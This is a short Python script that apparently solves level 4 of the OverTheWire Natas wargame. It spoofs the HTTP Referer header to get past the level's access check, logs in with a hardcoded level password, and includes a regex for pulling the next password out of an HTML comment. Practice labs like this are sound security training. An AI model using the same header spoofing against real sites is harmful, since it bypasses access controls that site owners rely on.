#!/usr/bin/python3

import requests
import re

user = "natas4"
next_level_user = "natas5"
pwd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}

url = "http://%s.natas.labs.overthewire.org/" % user

response = requests.get(url, auth=(user, pwd), headers = headers)
reg = "<!--The password for %s is (.*) -->" % next_level_user
# print(re.findall(reg, response.text))

print(response.text)
